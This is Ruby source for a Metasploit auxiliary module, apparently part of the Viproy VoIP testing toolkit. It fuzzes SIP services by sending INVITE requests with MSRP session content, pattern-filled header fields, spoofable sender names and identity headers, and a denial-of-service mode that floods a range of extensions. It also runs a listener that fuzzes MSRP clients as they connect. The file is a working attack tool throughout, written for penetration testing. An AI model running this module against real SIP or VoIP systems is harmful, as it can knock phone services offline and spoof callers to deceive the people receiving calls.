##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'digest/md5'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::SIP
  include Msf::Auxiliary::MSRP
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::TcpServer



  def initialize
    super(
      'Name'        => 'Viproy MSRP Fuzzer with SIP Invite Support',
      'Version'     => '1',
      'Description' => 'MSRP Fuzzing Module for SIP Services',
      'Author'      => 'fozavci',
      'License'     => 'GPL',
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service'
    )

    deregister_options('RHOSTS','USER_AS_PASS','THREADS','DB_ALL_CREDS', 'DB_ALL_USERS', 'DB_ALL_PASS','USERPASS_FILE','PASS_FILE','PASSWORD','BLANK_PASSWORDS', 'BRUTEFORCE_SPEED','STOP_ON_SUCCESS' )

    register_options(
      [
        OptInt.new('NUMERIC_MIN',   [true, 'Starting extension',0]),
        OptInt.new('NUMERIC_MAX',   [true, 'Ending extension', 9999]),
        OptBool.new('NUMERIC_USERS',   [true, 'Numeric Username Bruteforcing', false]),
        OptBool.new('DOS_MODE',   [true, 'Denial of Service Mode', false]),
        OptString.new('USERNAME',   [ true, "The login username to probe at each host", "NOUSER"]),
        OptString.new('PASSWORD',   [ true, "The login password to probe at each host", "password"]),
        OptString.new('TO',   [ true, "The destination number to probe at each host", "1000"]),
        OptString.new('FROM',   [ true, "The source number to probe at each host", "1000"]),
        OptString.new('FROMNAME',   [ false, "Custom Name for Message Spoofing", nil]),
        OptString.new('PROTO',   [ true, "Protocol for SIP service (UDP|TCP|TLS)", "UDP"]),
        OptBool.new('LOGIN', [false, 'Login Before Sending Message', false]),
        OptString.new('MESSAGE_CONTENT',   [ false, "Message Content", nil]),
        OptString.new('MESSAGE_TYPE',   [ false, "Message Content type (text/html, text/plain)", 'text/plain']),
        OptPort.new('SRVPORT',    [ true, "The local MSRP port to listen on.", 55001 ]),
        Opt::RHOST,
        Opt::RPORT(5060),
      ], self.class)

    register_advanced_options(
      [
        Opt::CHOST,
        Opt::CPORT(5060),
        OptString.new('USERAGENT',   [ false, "SIP user agent" ]),
        OptBool.new('DEBUG',   [ false, "Debug Level", false]),
        OptString.new('REALM',   [ false, "The login realm to probe at each host", nil]),
        OptString.new('LOGINMETHOD', [false, 'Login Method (REGISTER | INVITE)', "INVITE"]),
        OptBool.new('TOEQFROM', [true, 'FROM will be cloned from TO for all users', false]),
        OptString.new('CUSTOMHEADER', [false, 'Custom Headers for Requests', nil]),
        OptString.new('P-Asserted-Identity', [false, 'Proxy Identity Field. Sample: (IVR, 200@192.168.0.1)', nil]),
        OptString.new('Remote-Party-ID', [false, 'Remote Party Identity Field. (IVR, 200@192.168.0.1)', nil]),
        OptString.new('P-Charging-Vector', [false, 'Proxy Charging Field. Sample: icid-value=msanicid;msan-id=msan123;msan-pro=1 ', nil]),
        OptString.new('Record-Route', [false, 'Proxy Record-Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
        OptString.new('Route', [false, 'Proxy Route. Sample: <sip:100@RHOST:RPORT;lr>', nil]),
        OptInt.new('DOS_COUNT',   [true, 'Count of Messages for DOS',1]),
        OptString.new('MACADDRESS',   [ false, "MAC Address for Vendor", "000000000000"]),
        OptString.new('VENDOR',   [ true, "Vendor (GENERIC|CISCODEVICE|CISCOGENERIC|MSLYNC)", "GENERIC"]),
        OptString.new('CISCODEVICE',   [ true, "Cisco device type for authentication (585, 7940)", "7940"]),
        OptBool.new('USEREQFROM',   [ false, "FROM will be cloned from USERNAME", true]),
      ], self.class)
  end

  def setup
		super
		@clients={}
		@fuzzingtarget = nil
		@fuzzingstatus = nil
		print_status("The service parameters set")
  end

  def run
    # Login Parameters
    login = datastore['LOGIN']
    user = datastore['USERNAME']
    password = datastore['PASSWORD']
    realm = datastore['REALM']

    sockinfo={}
    # Protocol parameters
    sockinfo["proto"] = datastore['PROTO'].downcase
    sockinfo["vendor"] = datastore['VENDOR'].downcase
    sockinfo["macaddress"] = datastore['MACADDRESS']

    # Socket parameters
    sockinfo["listen_addr"] = datastore['CHOST']
    sockinfo["listen_port"] = datastore['CPORT']
    sockinfo["dest_addr"] =datastore['RHOST']
    sockinfo["dest_port"] = datastore['RPORT']
    sockinfo["msrp_port"] = datastore['MSRPPORT']

    # Message Content
    if datastore['MESSAGE_CONTENT'] =~ /FUZZ/
      message = Rex::Text.pattern_create(datastore['MESSAGE_CONTENT'].split(" ")[1].to_i)
    else
      message = datastore['MESSAGE_CONTENT'].gsub("\\n","\r\n")
    end

    # Message Content
    if datastore['MESSAGE_TYPE'] =~ /FUZZ/
      messagetype = Rex::Text.pattern_create(datastore['MESSAGE_TYPE'].split(" ")[1].to_i)
    else
      messagetype = datastore['MESSAGE_TYPE'] || 'text/plain'
    end

    # Dumb fuzzing for FROM, FROMNAME and TO fields
    if datastore['FROM'] =~ /FUZZ/
      from=Rex::Text.pattern_create(datastore['FROM'].split(" ")[1].to_i)
      fromname=nil
    else
      from = datastore['FROM']
      if datastore['FROMNAME'] =~ /FUZZ/
        fromname=Rex::Text.pattern_create(datastore['FROMNAME'].split(" ")[1].to_i)
      else
        fromname = datastore['FROMNAME'] || datastore['FROM']
      end
    end
    if datastore['TO'] =~ /FUZZ/
      to=Rex::Text.pattern_create(datastore['TO'].split(" ")[1].to_i)
    else
      to = datastore['TO']
    end

    # DOS mode setup
    if datastore['DOS_MODE']
      if datastore['NUMERIC_USERS']
        tos=(datastore['NUMERIC_MIN']..datastore['NUMERIC_MAX']).to_a
      else
        print_error("User file is not defined.")
        return
        #tos=load_user_vars
      end
    else
      tos=[to]
    end

    sipsocket_start(sockinfo)
    sipsocket_connect

    tos.each do |to|
      to.to_s
      if datastore['TOEQFROM']
        from=to
        fromname=nil
      end

	  print_status("Starting the MSRP services")
	  @msrpservice=framework.threads.spawn("MSRPService", false) {
        exploit
      }

	  print_status("Sending the INVITE request with MSRP SDP content")
      datastore['DOS_COUNT'].times do
        results = send_invite(
            'login' 	      => login,
            'loginmethod'  	  => datastore['LOGINMETHOD'].upcase,
            'user'  	      => user,
            'password'	      => password,
            'realm' 	      => realm,
            'from'  	      => from,
            'fromname'  	  => fromname,
            'to'  		      => to,
			      'sdp'			  => get_msrp_sdp(sockinfo),
        )

        if results != nil
          printresults(results) if datastore['DEBUG'] == true and results["rdata"] != nil

          if results["status"] == :succeed
            print_good("Invite is accepted by #{to}")
			      print_good("Received SDP Content: #{results["rdata"]["sdp"].gsub("\r\n","\t\r\n")}")
          else
            print_status("Invite is not accepted by #{to} (Server Response: #{results["rdata"]['resp_msg'].split(" ")[1,5].join(" ")})") if results["rdata"] != nil
          end
        end
      end
    end

    while @msrpservice.alive?
      while @fuzzingtarget.nil?
        Rex::ThreadSafe.sleep(0.5)
      end
      @fuzzingstatus = start_fuzzing(@fuzzingtarget,@fuzzingstatus) if @fuzzingstatus.nil?
    end

	  @msrpservice.kill

    sipsocket_stop
  end

	# Actions when clients connect
	def on_client_connect(c)
		@clients[c] = {
		  :name          => "#{c.peerhost}:#{c.peerport}",
		  :ip            => c.peerhost,
		  :port          => c.peerport,
		  :heartbeats    => "",
		  :server_random => [Time.now.to_i].pack("N") + Rex::Text.rand_text(28)
		}
		print_status("#{@clients[c][:name]} is connected")
	end

	# Actions when clients send data 
	def on_client_data(c)
		data = c.get_once
		return if not data
		print_status("#{@clients[c][:name]} Data Received:\n#{data.gsub("\r\n","\t\r\n")}")
		@clients[c][:buff] ||= ""
		@clients[c][:buff] << data
		@clients[c][:msrp] ||= {}
		@clients[c] = process_request(@clients,c)
		@fuzzingtarget ||= c
	end

end

